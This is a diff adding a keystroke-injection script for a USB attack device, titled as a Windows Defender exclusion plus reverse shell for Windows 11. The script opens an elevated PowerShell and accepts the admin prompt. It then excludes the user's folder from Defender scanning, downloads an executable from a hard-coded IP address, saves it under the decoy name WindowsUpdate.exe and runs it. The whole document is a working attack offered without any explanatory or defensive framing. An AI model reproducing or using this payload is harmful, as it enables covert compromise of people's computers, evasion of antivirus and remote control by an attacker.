@@ -1,0 +1,27 @@
+REM Windows Defender Exclusion + Reverse Shell
+REM Windows 11
+REM ==========================================
+CTRL esc
+DELAY 500
+STRING PowerShell
+DELAY 500
+RIGHT
+DELAY 500
+DOWN
+ENTER
+DELAY 1000
+ALT y
+ENTER
+DELAY 1000
+STRING cd $env:userprofile
+ENTER
+STRING Set-MpPreference -ExclusionPath $env:userprofile
+ENTER
+DELAY 500
+STRING wget http://45.77.240.49/pico/windowsx64.exe -OutFile WindowsUpdate.exe
+ENTER
+DELAY 500
+STRING .\WindowsUpdate.exe
+ENTER
+STRING exit
+ENTER
